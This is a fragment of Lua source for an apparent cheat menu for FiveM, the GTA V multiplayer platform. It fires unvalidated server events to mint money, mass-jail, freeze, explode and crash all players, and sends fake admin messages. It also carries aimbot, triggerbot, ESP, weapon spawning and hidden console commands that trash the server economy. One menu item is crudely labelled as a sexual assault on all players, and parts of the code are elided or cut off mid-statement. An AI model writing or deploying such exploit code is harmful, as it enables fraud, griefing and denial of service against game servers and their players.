	e.Button("~h~~w~Harvest ~w~Coke") then hcoke() elseif 
	e.Button("~h~~w~Transform ~w~Coke") then tcoke() elseif 
	e.Button("~h~~w~Sell ~w~Coke") then scoke() elseif 
	e.Button("~h~~r~Harvest Meth") then hmeth() elseif 
	e.Button("~h~~r~Transform Meth") then tmeth() elseif 
	e.Button("~h~~r~Sell Meth") then smeth() elseif 
	e.Button("~h~~p~Harvest Opium") then hopi() elseif 
	e.Button("~h~~p~Transform Opium") then topi() elseif 
	e.Button("~h~~p~Sell Opium") then sopi() elseif 
	e.Button("~h~~g~Money Wash") then mataaspalarufe() elseif 
	e.Button("~r~~h~Stop all") then matanumaispalarufe() elseif 
	e.CheckBox("~h~~r~Blow Drugs Up ~y~DANGER!", BlowDrugsUp, function(eC) BlowDrugsUp = eC end) then end; e.Display() elseif e.IsMenuOpened(bR) then a5("Basic VRP Triggers", 0.42, 0.42) if e.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("lscustoms:payGarage", {
        costs = -j
    }) end elseif 
	e.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("vrp_slotmachine:server:2", j) end elseif 
	e.Button("~r~~h~VRP ~s~Get driving license") then TriggerServerEvent("dmv:success") elseif 
	e.Button("~r~~h~VRP ~s~Bank Deposit") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("Banca:deposit", j) TriggerServerEvent("bank:deposit", j) end elseif 
	e.Button("~r~~h~VRP ~s~Bank Withdraw ") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""then TriggerServerEvent("bank:withdraw", j) TriggerServerEvent("Banca:withdraw", j) end end; e.Display() elseif e.IsMenuOpened(c0) then a5("Fun triggers to play with", 0.30, 0.30) if 
	e.Button("~h~Send Fake Message") then local eX = KeyboardInput("Enter player name", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 1000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("", eX, {
        0, 0x99, 255
    }, dT) end end elseif 
	e.Button("~h~~g~ESX ~y~CarThief ~s~TROLL") then aM("~y~esx_carthief ~g~required", true) aM("~g~Trying to send alerts", false) carthieftroll() end; e.Display() elseif e.IsMenuOpened(bU) then a5("C'est la ~b~B~a~k~a~r~r~r ~s~ Menu", 0.58, 0.58) if 
	e.MenuButton("~h~~p~#~s~ Destroyer Menu", bY) then elseif 
	e.MenuButton("~h~~p~#~s~ All Players Troll", c8) then elseif 
	e.MenuButton("~h~~p~#~s~ ESP Menu", c5) then elseif 
	e.MenuButton("~h~~p~#~s~ Crosshairs", c6) then elseif 
	e.CheckBox("~h~TriggerBot", TriggerBot, function(eC) TriggerBot = eC end) then elseif 
	e.CheckBox("~h~SilentAim/Aimbot", Aimbot, function(eC) Aimbot = eC end) then elseif 
	e.CheckBox("~h~Player Blips", ej, function(ej) end) then ds = not ds; ej = ds elseif 
	e.CheckBox("~h~Name Above Players ~g~v1", dt, function(eC) dt = eC; du = false end) then elseif 
	e.CheckBox("~h~Name Above Players n Indicator ~g~v2", du, function(eC) du = eC; dt = false end) then elseif 
	e.CheckBox("~h~~r~Confirms~s~ MSWITCH", dv, function(eC) dv = eC end) then end; e.Display() elseif e.IsMenuOpened(c6) then a5("Crosshairs modifications", 0.29, 0.29) if e.CheckBox("~h~~y~Original ~s~Crosshair", crosshair, function(eC) crosshair = eC; crosshairc = false; crosshairc2 = false end) then elseif 
	e.CheckBox("~h~~r~CROSS ~s~Crosshair", crosshairc, function(eC) crosshair = false; crosshairc = eC; crosshairc2 = false end) then elseif 
	e.CheckBox("~h~~r~DOT ~s~Crosshair", crosshairc2, function(eC) crosshair = false; crosshairc = false; crosshairc2 = eC end) then end; 
	
	e.Display() elseif e.IsMenuOpened(c8) then if 
	e.Button("~h~~r~Jail~s~ All players") then for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "") TriggerServerEvent("ljail:jailplayer") end elseif 
	e.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif 
	e.Button("~h~~r~Rocket~s~ All players") then cE() elseif 
	e.Button("~h~~r~Kick ~w~Everyone From ~y~~h~Vehicle ~o~NEW") then
        for i=0, 128 do
            ClearPedTasksImmediately(GetPlayerPed(i))
        end elseif
	e.Button("~h~~r~Rape~s~ All players", "~r~WARNING") then RapeAllFunc() elseif 
	e.Button("~h~~r~Cage~s~ All players") then cG() elseif 
	e.Button("~h~~r~BORGAR~s~ All players") then cA() elseif 
	e.Button("~h~~o~_!_ ~r~CRASH~s~ Everyone~o~ _!_", "~r~WARNING") then cv() elseif 
	e.CheckBox("~h~~r~Freeze~s~ All players", freezeall, function(eC) freezeall = eC end) then elseif 
	e.CheckBox("~h~~r~Explode~s~ All players", blowall, function(eC) blowall = eC end) then end;
    ...
    e.Display() elseif e.IsMenuOpened(b_) then a5(";)", 0.30, 0.30) if 
	e.Button("~h~~p~#~s~ Cedric~r~#~r~ ~p~Team") then aM("~h~~o~Frerot!~s~.", false) aM("~h~~o~Azy jvous laisse jdois appeller ma meuf <3~s~.", false) aM("~h~~o~Lacheurr~s~.", false) elseif 
	e.Button("~h~~p~#~s~ Vincent~r~#~r~ ~p~DEV") then aM("~h~~o~Clique pas sur moi bakar!~s~.", false) aM("~h~~o~Jsuis un pro Mdrrr :3~s~.", false) aM("~h~~o~Sale Tricheur~s~.", false) elseif 
	e.Button("~h~~p~#~s~ Hakim~r~#~r~ ~p~Team") then aM("~h~~o~Mode troll activée fdp~s~.", false) aM("~h~~o~Mdrrr :3~s~.", false) aM("~h~~o~Cquoi le rp ? x'D~s~.", false) elseif 
	e.Button("~h~~p~#~s~ Ibraaahim~r~#~r~ ~p~Team") then aM("~h~~o~IbraTv!~s~.", false) aM("~h~~o~Puta click avec voiture a 600km/h :3~s~.", false) aM("~h~~o~MDRRRRR~s~.", false) end;
	
	e.Display() elseif e.IsMenuOpened(ms) then a5("Option Menu", 0.18, 0.18) if
	e.Button("~h~~r~Stop ~r~Menu") then Enable = false
    while not HasModelLoaded(GetHashKey(eD)) do Citizen.Wait(0) RequestModel(GetHashKey(eD)) end;
    local eE = CreateObject(GetHashKey(eD), 0, 0, 0, true, true, false) SetEntityVisible(eE, 0, 0) AttachEntityToEntity(eE, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) end;
	
	e.Display() elseif e.IsMenuOpened(cq) then a5("Weapon list to give yourself", 0.58, 0.58) for eJ, eZ in pairs(bo) do
        if e.
    ...
    if veh == nil then veh = "adder"
        ...
        if e.
    Button(bn[i]) then GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(bn[i]), 1000, false, true) end end; 
	e.Display() elseif e.IsMenuOpened(c5) then a5("Extra Sensory Perception menu", 0.34, 0.34) if 
	e.CheckBox("~h~~r~ESP ~s~MasterSwitch", esp, function(eC) esp = eC end) then elseif 
	e.CheckBox("~h~~r~ESP ~s~Box", espbox, function(eC) espbox = eC end) then elseif 
	e.CheckBox("~h~~r~ESP ~s~Info", espinfo, function(eC) espinfo = eC end) then elseif 
	e.CheckBox("~h~~r~ESP ~s~Lines", esplines, function(eC) esplines = eC end) then end; 
	
	e.Display() elseif e.IsMenuOpened(c4) then a5("Apply some cool stuff to your car", 0.46, 0.46) local veh = GetVehiclePedIsUsing(PlayerPedId()) if 
	e.MenuButton("~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning", cg) then elseif 
	e.MenuButton("~h~~p~#~s~ ~h~~r~Performance ~s~Tuning", cf) then elseif 
	e.Button("~h~Change Car License Plate") then da() elseif 
	e.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(eC) RainbowVeh = eC end) then elseif 
	e.Button("~h~Make vehicle ~y~dirty") then Clean(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif 
	e.Button("~h~Make vehicle ~g~clean") then Clean2(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif 
	e.Button("~h~~b~Max ~s~Tuning") then MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif 
	e.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(eC) rainbowh = eC end) then end; 
	
	e.Display() elseif e.IsMenuOpened(cd) then a5("Give your car nitro", 0.46, 0.46) if 
	e.ComboBox("~h~Engine ~r~Power ~s~Booster", ep, en, eo, function(aq, ar) en = aq; eo = ar; SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), eo * 20.0) end) then elseif 
	e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(eC) t2x = eC; t4x = false; t10x = false; t16x = false; txd = false; tbxd = false end) then elseif 
	e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(eC) t2x = false; t4x = eC; t10x = false; t16x = false; txd = false; tbxd = false end) then elseif 
	e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(eC) t2x = false; t4x = false; t10x = eC; t16x = false; txd = false; tbxd = false end) then elseif 
	e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(eC) t2x = false; t4x = false; t10x = false; t16x = eC; txd = false; tbxd = false end) then elseif 
	e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~XD", txd, function(eC) t2x = false; t4x = false; t10x = false; t16x = false; txd = eC; tbxd = false end) then elseif 
	e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~BIG XD", tbxd, function(eC) t2x = false; t4x = false; t10x = false; t16x = false; txd = false; tbxd = eC end) then end; 
	
	e.Display() end; Citizen.Wait(0) end end) RegisterCommand("chocolate", function(f3, f4, f5) ao() print("^1"..
    " WTFFFF BANANA!") end, false) RegisterCommand("lol", function(f3, f4, f5) haharip = true; bananapartyall() EconomyDy2() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "") TriggerServerEvent("ljail:jailplayer") end end, false) RegisterCommand("pk", function(f3, f4, f5) bL = false end, false)